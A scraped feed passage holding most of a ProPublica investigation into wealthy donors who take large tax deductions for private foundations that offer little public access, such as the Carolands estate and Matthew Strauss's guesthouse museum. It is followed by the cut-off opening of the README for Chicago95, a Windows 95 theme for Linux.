https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Carolands.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=867&amp;q=75&amp;w=1300&amp;s=22c36e389196647812320c3b4c73610d 1300w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Carolands.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=967&amp;q=75&amp;w=1450&amp;s=4e82543616459e2a60683d8afe75c401 1450w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Carolands.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=1067&amp;q=75&amp;w=1600&amp;s=de48be386171f71df2fb7111691eb371 1600w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Carolands.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=1333&amp;q=75&amp;w=2000&amp;s=478825e7373cf07a09932073c5df987b 2000w">

            
    
<figcaption>
        <span>The Carolands Estate</span>
    
        <span>
        <span>Credit: </span>
        San Francisco Chronicle/AP Images
    </span>
    
    
    </figcaption>

</figure>

        
    
                    
<p data-pp-blocktype="copy" data-pp-id="6.0">There was a lot of money at stake. Johnson, a Republican megadonor and part owner of the San Francisco Giants, had gotten an appraisal valuing the property at $130 million, a price higher than any publicly reported home sale in the U.S. up to that time, and five times the $26 million he and his wife, Ann, had reportedly paid 14 years earlier to buy and restore what then was a dilapidated property.</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="8.0">The plan worked. The IRS granted the foundation tax-exempt status. That allowed the Johnsons to collect more than $38 million in tax savings from the estate over five years, confidential tax records show.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="9.0">But the Johnsons never opened Carolands to the public for 40 hours a week. Instead, the foundation bestows tickets on a few dozen lottery winners, who receive two-hour tours, led by docents, most Wednesdays at 1 p.m. Self-guided tours, like the ones described in the attachments to Johnson’s IRS application, are not offered. “It sounds like a vanity project with little to no public benefit,” said Roger Colinvaux, a professor of law at The Catholic University of America who specializes in the tax law of nonprofit organizations. (Experts also questioned Carolands’ $130 million valuation — which turbocharged the Johnsons’ deduction — while acknowledging that as long as it’s based on a qualified appraisal, which it was, the IRS is unlikely to challenge the size of the deduction.)</p>
        
    
                    

<figure data-pp-id="10" data-pp-blocktype="image">

    


                    
    


    <img alt="" width="2400" height="3600" loading="lazy" js-autosizes="" src="https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Johnsons.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=1200&amp;q=75&amp;w=800&amp;s=57bca0114e9469e43e90d70835aa55b2" srcset="https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Johnsons.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=600&amp;q=75&amp;w=400&amp;s=e02704b50d8d947c0e8d9435e907efb7 400w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Johnsons.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=1200&amp;q=75&amp;w=800&amp;s=57bca0114e9469e43e90d70835aa55b2 800w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Johnsons.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=1800&amp;q=75&amp;w=1200&amp;s=0195dbd6c6b24333769bdf485d0bec1d 1200w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Johnsons.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=1950&amp;q=75&amp;w=1300&amp;s=a827265a9b23031ee6c86b572beb5bfa 1300w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Johnsons.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=2175&amp;q=75&amp;w=1450&amp;s=feeba1156ef48ee925948790038d3df0 1450w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Johnsons.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=2400&amp;q=75&amp;w=1600&amp;s=8a20e641f9bc816b2056382b7e0e424a 1600w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Johnsons.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=3000&amp;q=75&amp;w=2000&amp;s=962fac060f714f82ca17f62eb25db3e4 2000w">

            
    
<figcaption>
        <span>Charles Johnson and his wife, Ann, collected more than $38 million in tax deductions as a result of donating their estate.</span>
    
        <span>
        <span>Credit: </span>
        Mike Coppola/Getty Images for the New York Philharmonic
    </span>
    
    
    </figcaption>

</figure>

        
    
                    
<p data-pp-blocktype="copy" data-pp-id="11.0">For the ultrawealthy, donating valuables like artwork, real estate and stocks to their own charitable foundation is an alluring way to cut their tax bills. In exchange for generous tax breaks, they are supposed to use the assets to serve the public: Art might be put on display where people can see it, or stock sold to fund programs to fight child poverty. Across the U.S., such foundations <a href="https://fred.stlouisfed.org/series/BOGZ1FL164090015Q">hold over $1 trillion in assets</a>.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="12.0">But a ProPublica investigation reveals that some foundation donors have obtained millions of dollars in tax deductions without holding up their end of the bargain, and sometimes they personally benefit from donations that are supposed to be a boon to the public. A tech billionaire used his charitable foundation to buy his girlfriend’s house, then stayed there with her while he was going through a divorce. A real estate mogul keeps his nonprofit art museum in his guesthouse and told ProPublica that he hadn’t shown it to a member of the public since before the pandemic. And a venture capitalist couple’s foundation bought the multimillion dollar house next to their own without ever opening the property to the public.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="13.0">Unlike public charities, private foundations are typically funded by a single donor or family, who retain a high degree of control long after receiving a tax break for ostensibly giving their possessions away. “This is the classic problem with private foundations: Substantial contributors can see it as their thing,” said Philip Hackney, a law professor at the University of Pittsburgh and former IRS attorney. “There’s generally not a coalition who cares, other than the family, so there’s nothing to ensure that the assets are used for a particular purpose,” he added.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="14.0">In theory, it’s illegal to fail to provide a public benefit or to make personal use of foundation assets. But the rules defining what’s in the public interest are vague, according to tax experts; for example, Congress has never defined how many hours a museum would need to be open to be considered accessible to the public. And with the IRS depleted by a decade of budget cuts, enforcement has been lax. The agency examines an average of 225 returns among the 100,000 filed by private foundations each year, according to agency statistics.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="15.0">Peter Kanter, an attorney representing the Carolands Foundation, told ProPublica that “we believe pretty strongly that the foundation is serving its purpose of preserving and showcasing this historic and unique property to the public.” He said that tours are limited because the foundation has only a few volunteer docents who are knowledgeable about the home, and because significantly higher traffic might compromise the foundation’s ability to preserve its unique architecture. Kanter also emphasized the public value of free charitable events that the foundation occasionally hosts for other nonprofits at the estate.</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="17.0">At the Carolands, guides didn’t emphasize benefits to the public — just the opposite. A docent told my tour group that the foundation prefers lotteries to holding regular hours and charging admission. This, he explained, preserves the home for those who “really want to see it.” Indeed, exclusivity and rarefied taste were a theme of the tour, which included tales of the exacting specifications of Harriett Carolan, the Pullman heiress, a Francophile who imported an entire salon that had been built in France on the eve of the revolution. (For their parts, when Ann and Charles Johnson unveiled the restored chateau at a costume party, they dressed as Marie Antoinette and Louis XVI.)</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="18.0">Before the tour, one of the docents asked how many of us had ever visited a nearby historical mansion, called the Filoli estate, built in the same era as the Carolands. Many hands shot up among the tour group. When he asked if any of us had visited the Carolands before, no one raised their hand.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="19.0">Curious, I popped by Filoli the following afternoon. It is run by a public charity and is open from 10 to 5 every day. In contrast to the Carolands, I was able to simply show up, pay admission and enter. Inside, I encountered dozens of employees who provided helpful information and watched over the manor and its gardens while more than a hundred visitors wandered about. Photography, which had been prohibited inside the Carolands, was permitted at Filoli.</p>
        
    
                    
<hr>

        
    
                    
<p data-pp-blocktype="copy" data-pp-id="21.0">Congress and the IRS have never clearly defined what qualifies as a “public benefit.” By contrast, identifying a private benefit is much simpler. Decades ago Congress prohibited what it called self-dealing by insiders. The laws are designed to keep them from using or profiting from foundation assets. Among other things, the rules bar leases between a donor and their foundation. Violations can incur a penalty known as an excise tax.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="22.0">At least one billionaire appears to have run afoul of those real estate rules, according to tax experts. Since 2009, Ken Xie, CEO of a cybersecurity company called Fortinet, has gotten more than $30 million in income tax deductions for contributing shares of his business to a private foundation that he started to support various charitable causes.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="23.0">In 2017, Xie’s foundation (whose <a href="https://projects.propublica.org/nonprofits/organizations/271208110/202233059349101733/full">sole officers are Xie and his brother</a>) spent $3 million to purchase a home in Cupertino, California, from his new girlfriend while he was going through an acrimonious divorce. After the foundation purchased the home, Xie allowed his girlfriend to continue living there; he also stayed there for a time. These details emerged in a lawsuit filed by the now-ex-girlfriend, who was permitted to file the suit anonymously, in county court. (The suit is ongoing.) According to leases filed in the case, the foundation charged her rent, but Xie agreed to pay half of it.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="24.0">Xie himself appears to have been aware that he risked violating the rules. In a December 2019 text message to his girlfriend that was included in the court case, Xie wrote, “I covered some house part but also try not creat issue related to foundation and tax, believe will make some progress next few months by transfer house out of foundation, may need 2 step by first transfer to other entity.” The next month, his foundation transferred the property to an LLC.</p>
        
    
                    

<figure data-pp-id="25" data-pp-blocktype="image">

    


                    
    


    <img alt="" width="4884" height="3159" loading="lazy" js-autosizes="" src="https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Xie.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=517&amp;q=75&amp;w=800&amp;s=d8f05dfbfe4d4cea130b5eb1da68b920" srcset="https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Xie.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=259&amp;q=75&amp;w=400&amp;s=97ec454f4a21a013213b43409981c38c 400w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Xie.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=517&amp;q=75&amp;w=800&amp;s=d8f05dfbfe4d4cea130b5eb1da68b920 800w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Xie.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=776&amp;q=75&amp;w=1200&amp;s=ca0f8ec1b0693d1a0f3adb54ba296ed3 1200w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Xie.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=841&amp;q=75&amp;w=1300&amp;s=dcfe70cf7df317bbf5f82302cb6f45d5 1300w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Xie.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=938&amp;q=75&amp;w=1450&amp;s=9d92de9b1c4fd9f2a0cbb7774b7699b3 1450w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Xie.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=1035&amp;q=75&amp;w=1600&amp;s=276ced8c08c8de667fe5c74f34b6227b 1600w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Xie.JPG?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=1294&amp;q=75&amp;w=2000&amp;s=7d35628aec1f78040b79434a8697e08f 2000w">

            
    
<figcaption>
        <span>Ken Xie, CEO of cybersecurity company Fortinet, has earned more than $30 million worth of tax deductions by donating shares to a private foundation.</span>
    
        <span>
        <span>Credit: </span>
        K.Y. Cheng/South China Morning Post/Getty Images
    </span>
    
    
    </figcaption>

</figure>

        
    
                    
<p data-pp-blocktype="copy" data-pp-id="26.0">In an email to ProPublica, Gordon Finwall, a lawyer for Xie, said the foundation is “fully committed to complying with all applicable rules and regulations.” He acknowledged that Xie “spent some time at the Cupertino property in 2017 and 2018,” but asserted that the sublease was never in effect and Xie never paid his ex-girlfriend any rent.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="27.0">Two days after I emailed Finwall in April inquiring about the Xie Foundation’s purchase of the house, the foundation <a href="https://www.documentcloud.org/documents/23882476-xie_foundation_2017_amendment#document/p2/a2363407">filed records with the California attorney general’s office</a>, stating that it had “discovered a self-dealing event” and including a federal tax return with the word “amended” handwritten at the top. In his email to ProPublica, Finwall said that, after amending its returns, the foundation “paid some excise taxes related to Mr. Xie’s stay at the property.” Finwall also said that Xie had planned to file the amended returns months earlier but didn’t do so because his accountant mailed the IRS forms to Xie at an outdated address.</p>
        
    
                    
<hr>

        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="30.0">Despite the blurriness of many rules relating to foundations, the issue of public access has given rise to controversy in the past. After a New York Times article in 2015 exposed the <a href="https://www.nytimes.com/2015/01/11/business/art-collectors-gain-tax-benefits-from-private-museums.html">limited hours of many private museums</a>, the Senate Finance Committee, under then-chairman Orrin Hatch, launched an investigation. <a href="https://www.finance.senate.gov/chairmans-news/hatch-concludes-review-into-tax-exempt-private-museums-notes-concerning-findings">Hatch expressed concerns</a> about museums that require advance reservations and maintain limited public hours. He questioned instances where “founding donors continue to play an active role in management and operations of the museum” and “museum buildings are adjacent to the donor’s private residence.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="31.0">But no meaningful rule changes followed the investigation. And absent new laws, cracking down on abusive foundations would require the IRS to put scarce resources into an area that many experts said simply isn’t a priority, particularly after the agency’s previous attempt to police abuse by political nonprofits a decade ago caused a conservative firestorm.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="32.0">The agency doesn’t appear likely to increase oversight any time soon. A recently published budget blueprint outlining IRS priorities for the $80 billion in new funding it received from the Inflation Reduction Act made no mention of increasing audits of private foundations.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="33.0">“The IRS protects the public interest by applying the tax law with integrity and fairness to all,” the agency wrote in a statement to ProPublica. The statement cited a compliance program that “focuses on high-risk issues” among tax-exempt organizations, and it asserted that the program “deploys the right resources to address noncompliance issues.” The IRS also pointed to a recent tax court case that it won against a foundation that, among other things, kept a collection of African artifacts in a basement with no public access. And an agency spokesperson highlighted a rule stating that foundations can lose their exempt status if they operate in a manner “materially different” than what they claimed they would do in their initial application.</p>
        
    
                    
<hr>

        
    
                    
<p data-pp-blocktype="copy" data-pp-id="35.0">Despite the attention spurred by the Hatch investigation, some foundations seem to have continued undeterred. Consider the Lijin Gouhua Foundation. Collecting Chinese paintings and sharing them with the public was the stated mission of the organization, which was launched by Bay Area venture capitalists J. Sanford “Sandy” Miller and his then-wife, Vinie Zhang Miller, in 2006. Since then, the couple generated $5.6 million worth of income tax write-offs largely from donating shares of tech companies like Twitter and Snapchat to their private foundation.</p>
        
    
                                  
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="37.0">When the couple cashed in the foundation’s stock to buy a potential museum space for the art in 2017, they opted against a high-traffic location where lots of people could easily access it. Instead, they chose <a href="https://www.redfin.com/CA/Woodside/1540-Portola-Rd-94062/home/2009633">the $3.1 million house</a> adjacent to <a href="https://www.youtube.com/watch?v=hBpp_3YhK_0">their own estate in Woodside</a>, an exclusive enclave outside of San Francisco.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="38.0">“A private museum is usually by appointment only,” Vinie Miller said when asked about the out-of-the-way location. “We wouldn’t hold long showing hours. It’s usually people we have a relationship with.” She said that the main way for the public to access the collection was through loans of artwork the foundation has made to universities, other museums and galleries. (In an email, Sandy Miller wrote: “Please be advised that I am not married to Vinie and that I have no involvement with the Lijin Gouhua Foundation.” Public records show Vinie filed for divorce from him in 2019; Sandy ceased to be listed as president of the foundation on IRS filings that year as well.)</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="39.0">The museum that was purchased with the foundation’s tax-exempt funds never actually opened. Vinie Miller said the plan was “hypothetical” and that the foundation held the home as an investment instead. That’s at odds with the foundation’s publicly available tax returns, which have listed the property as being used for charitable purposes. (Miller did not respond to a follow-up question asking about the discrepancy between her statements and the foundation’s tax returns.) As Colinvaux, the specialist in nonprofits, put it, “If it’s an investment asset, then it’s not a charitable use asset, and they shouldn’t be counting it as such” on their IRS filings.</p>
        
    
                    
<hr>

        
    
                    
<p data-pp-blocktype="copy" data-pp-id="41.0">In one similar instance involving another foundation, the IRS expressed hesitation about the organization’s plans, then backed off. In 2006, San Diego real estate magnate Matthew Strauss sought a $4 million write-off for the guesthouse that held part of his contemporary art collection. <a href="https://www.documentcloud.org/documents/23879865-strauss_1023_public#document/p215/a2365113">An IRS employee wrote</a> that it appeared Strauss and his wife “are using the assets of the Foundation (the guest house gallery) as a facility for housing and displaying a large portion of their personal art collection for their enjoyment and benefit as well as the enjoyment and benefit of invited guests.” The employee wanted to know when actual art would be donated, what kind of access the public would have to the gallery, and how the couple planned to inform people that they could visit, among other things.</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="43.0">The couple’s lawyer assured the IRS representative that she’d gotten the wrong impression. The Strausses would host no personal events there and the public would have access to view the collection “upon request.” The couple anticipated donating “substantially all” of their $50 million collection to the foundation. They couldn’t say when, but the couple planned to make donations “in a fashion that minimizes income taxes.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="44.0">As 2006 turned into 2007 with no sign that the IRS would bless its museum tax deduction, the couple sought political help. In January, the head of the IRS’ tax-exempt division <a href="https://www.documentcloud.org/documents/23879865-strauss_1023_public#document/p15/a2365110">received a letter</a> from the office of <a href="https://projects.propublica.org/represent/members/F000062-dianne-feinstein">Sen. Dianne Feinstein (D.-Calif.)</a>, inquiring about the delay in approving the application from the couple, who’d given her more than $15,000 over the past few election cycles. That June, their application was approved. (“The senator was not advocating in support of the constituent’s application, but instead requested clarification on the case after nine months of an inability to resolve the case,” a spokesperson for Feinstein said, noting that her office frequently sends such letters on behalf of constituents).</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="45.0">As of 2021, 15 years after the Strausses’ lawyer told the IRS they would donate $50 million in art, the foundation holds $6 million worth. The rest remained in a private trust.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="46.0">To learn more about Strausses’ gallery, I tried to schedule a visit earlier this year. As with Carolands, I was able to get in, but it took some effort. The foundation’s website doesn’t list an address or hours of operation. A contact form available for visitors to inquire about tours wasn’t working when I tried it repeatedly. I ultimately had to pester employees of Strauss’ real estate company for a couple of weeks before someone responded and asked me to submit a biography for their boss to review. (My bio described me as a reporter with ProPublica, with the first coverage area listed as “tax policy.”)</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="47.0">Soon after I sent in my biography, I received a call from Matthew Strauss himself. After a brief conversation, he declared me “worthy” of the first tour he said he’d given in three years and sent along directions to the museum.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="48.0">I didn’t see any signs outside the couple’s estate, nicknamed Rancho Del Arte, that indicated a museum could be found anywhere on the premises. From the outside, their guesthouse seemed relatively unassuming, its multimillion-dollar value betrayed only by the horse stables and privacy hedges of the nearby mansions I passed on the way in. A path wide enough for a golf cart wound its way through a grove of palm trees, past oversized sculptures and a private tennis court, to the Strausses’ own sprawling abode a hundred yards or so away.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="49.0">The inside was more remarkable. The Strausses remodeled the building in the early 2000s with custom fixtures to illuminate works from their collection of contemporary art. Sounds and music from dueling audiovisual works on the main floor flooded the space, while the click-clack of a never-ending ping pong game echoed up from a conceptual piece in the basement. These noisier forms shared space with paintings on canvas and metal and with textured mixed-media compositions.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="50.0">Dressed in sweats and sporting a Bentley baseball cap, Strauss personally led my solo tour, meandering from one prized possession to the next. He exhibited an uncanny memory for how he obtained each piece, likening the acquisition process to the thrill of a hunt. (“Once you get the fox, it’s not as much fun.”) He spoke of one painting as “my poor man’s ‘Mona Lisa’” and another as “my victory piece.”</p>
        
    
                    

<figure data-pp-id="51" data-pp-blocktype="image">

    


                    
    


    <img alt="" width="4928" height="3264" loading="lazy" js-autosizes="" src="https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Strauss.jpg?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=530&amp;q=75&amp;w=800&amp;s=512f9303262432a140a2d0897c41259b" srcset="https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Strauss.jpg?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=265&amp;q=75&amp;w=400&amp;s=7fccc04a3d93fe1e425e093bb5460ded 400w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Strauss.jpg?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=530&amp;q=75&amp;w=800&amp;s=512f9303262432a140a2d0897c41259b 800w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Strauss.jpg?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=795&amp;q=75&amp;w=1200&amp;s=4a2bc508e1191df4b615c5bfd3ef9abf 1200w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Strauss.jpg?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=861&amp;q=75&amp;w=1300&amp;s=866b089a8068f31bc788cf4fa3d4bf6f 1300w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Strauss.jpg?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=960&amp;q=75&amp;w=1450&amp;s=ba8a1f63e217bf8c7f7e153b2f8e139e 1450w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Strauss.jpg?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=1060&amp;q=75&amp;w=1600&amp;s=444e4edcfa80bcc52fa25002b7a71b61 1600w, https://img.assets-d.propublica.org/v5/images/20230726-IRS-Foundation-Strauss.jpg?crop=focalpoint&amp;fit=crop&amp;fm=webp&amp;fp-x=0.5&amp;fp-y=0.5&amp;h=1325&amp;q=75&amp;w=2000&amp;s=e9119f2a57ab8df01f1cea479852dc3b 2000w">

            
    
<figcaption>
        <span>Matthew Strauss in front of “Sunshine and Snow,” by Kenneth Noland, at his foundation’s museum.</span>
    
        <span>
        <span>Credit: </span>
        Jeff Ernsthausen/ProPublica
    </span>
    
    
    </figcaption>

</figure>

        
    
                    
<p data-pp-blocktype="copy" data-pp-id="52.0">Halfway through my visit, we stopped to take in the view from the museum’s balcony. “At this point, you can see why I had to buy this property,” he told me, explaining that he’d bought the guesthouse from his neighbor in the late 1990s to keep anyone else from moving in. “Anybody here, they would have knocked it down, and you know, really ruined our privacy.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="53.0">As the tour continued from room to room, Strauss leaned into his persona as a friendly professor. He asked probing questions about each modern piece before delving into centuries of art history. “I really show [people] how to look at art, I don’t just tell them ‘This is So-and-So,’” he said, recalling the tours he used to give to college students.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="54.0">Before the pandemic, the foundation would conduct a dozen or two dozen tours each year, drawing a total of about 400 visitors to the gallery, according to the foundation’s website. But even as California’s other museums welcomed guests back in the spring of 2021, the foundation remained dormant.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="55.0">Strauss acknowledges the tax benefits of having the foundation and maintained that he had made efforts to make his art available to the public. “I feel like I have an obligation to show it, but it’s got to be under favorable conditions,” he said. He’d told me he’d like to get tours going again, but only when schools and universities stop requiring masks and start treating COVID-19 “like normal.”</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="57.0">Strauss said he gets requests from individuals to see the collection “all the time.” But, he added, “to show one or two, it’s not worthy. It’ll wear me out.” Letting people come on their own was out of the question (they might damage the art), as was having regular public hours (it’s a zoning issue, he said, and the neighbors would never go for it). Strauss declined to respond to a list of follow-up questions that I sent after the tour.</p>
        
    
                                  
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="59.0">A couple months from turning 90, Strauss was more focused on the big picture. Sooner or later, he said, he plans to give away most of the collection, which he estimates to be worth hundreds of millions of dollars. Most of his personal collection will go to the Museum of Contemporary Art San Diego, while the foundation’s assets will go to the University of California, San Diego under a deal that is in the process of being finalized.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="60.0">As we made our way through the gallery, Strauss paused before a reproduction of a Life magazine cover featuring the 1964 World’s Fair in New York. Did anything catch my eye about it, he asked. </p>

<p data-pp-blocktype="copy" data-pp-id="60.1">I stared for a moment.</p>

<p data-pp-blocktype="copy" data-pp-id="60.2">“Why don’t you knock on it,” he suggested. “Maybe that’ll help you.” </p>

<p data-pp-blocktype="copy" data-pp-id="60.3">Strauss sensed my hesitation to touch the art — he wanted me to see it was made of metal — and tried to put me at ease.</p>

<p data-pp-blocktype="copy" data-pp-id="60.4">“You’re not supposed to,” he chuckled. “But this is my museum!”</p>

<p data-pp-blocktype="copy" data-pp-id="60.5"><em>For this story, ProPublica reviewed a nationwide database of parcels provided by the real estate data analytics firm Regrid to find homes owned by private foundations.</em></p>
        
            
    
    
    
                            

<figure data-pp-id="1" data-pp-blocktype="embed">

    
<div>
            <p id="help-us-report-on-taxes-and-the-ultrawealthy">Help Us Report on Taxes and the Ultrawealthy</p>
                <p>Do you have expertise in tax law, accounting or wealth management? Do you have tips to share? Here’s how to get in touch. We are looking for both specific tips and broader expertise.</p>
    </div>


                        

<div>
    <div>
        <p><span>
            <strong>I may know something related to your investigation.</strong>
        </span>
        <a data-toggle-section="section-tip-online" href="https://projects.propublica.org/tips/help-us-report-on-taxes-and-ultrawealthy/#form">Submit a Tip Through Our Form</a>
        <span>
            <strong>We take privacy seriously.</strong> Any tips you submit via
            the above form are encrypted on our end. But if you wish for
            additional anonymity, please get in touch via one of these methods:
        </span></p>
    </div>
    <p><span>
            <strong>I am knowledgeable in one of these areas and can answer
                questions or help you understand technicalities.</strong>
        </span>
        <a data-toggle-section="section-expert-help" href="https://projects.propublica.org/tips/help-us-report-on-taxes-and-ultrawealthy/#expert">Volunteer Your Expertise</a>
    </p>
</div>
            
    
<figcaption>
    
    
    
    </figcaption>


</figure>

            
        
    
                    <div data-pp-location="bottom-note">
                        <p><a href="https://www.propublica.org/people/paul-kiel">Paul Kiel</a> and <a href="https://www.propublica.org/people/andrea-suozzo">Andrea Suozzo</a> contributed data analysis.</p>

        </div><!-- end .article-body__bottom-notes -->
        
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Chicago95 – Windows 95 Theme for Linux (209 pts)]]></title>
            <link>https://github.com/grassmunk/Chicago95</link>
            <guid>36929096</guid>
            <pubDate>Sun, 30 Jul 2023 08:28:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/grassmunk/Chicago95">https://github.com/grassmunk/Chicago95</a>, See on <a href="https://news.ycombinator.com/item?id=36929096">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">Chicago95</h2>
<h4 tabindex="-1" dir="auto">XFCE / Xubuntu Windows 95 Total Conversion</h4>
<p dir="auto">
<a target="_blank" rel="noopener noreferrer" href="https://github.com/grassmunk/Chicago95/blob/master/Screenshots/Chicago95_Desktop.png"><img src="https://github.com/grassmunk/Chicago95/raw/master/Screenshots/Chicago95_Desktop.png" alt="Chicago95 Desktop"></a>
</p>
<p dir="auto"><em>Click <a href="https://github.com/grassmunk/Chicago95/blob/master/Screenshots/SCREENSHOTS.md">here</a> for more screenshots</em></p>
<p dir="auto">I was unhappy with the various XFCE/GTK2/GTK3 Windows 95 based themes and decided to make one that was more consistent across the board for theming.</p>
<h3 tabindex="-1" dir="auto">Included in this theme:</h3>
<ul dir="auto">
<li>Icons to complete the icon theme started with Classic95</li>
<li>GTK2 and GTK3 themes</li>
<li>Edited Redmond XFWM theme to more accurately reflect Windows 95</li>
<li>Chicago95 Plus! A tool to preview and install Windows 95/98/ME/XP themes</li>
<li>Plymouth theme created from scratch</li>
<li>An MS-DOS inspired theme for oh-my-zsh</li>
<li>Partial support for HiDPI monitors</li>
<li>Partial icon theme for LibreOffice 6+</li>
</ul>
<h3 tabindex="-1" dir="auto">Requirements:</h3>
<ul dir="auto">
<li>GTK+ 3.22 or 3.24</li>
<li>Xfce 4.12, 4.14, 4.16</li>
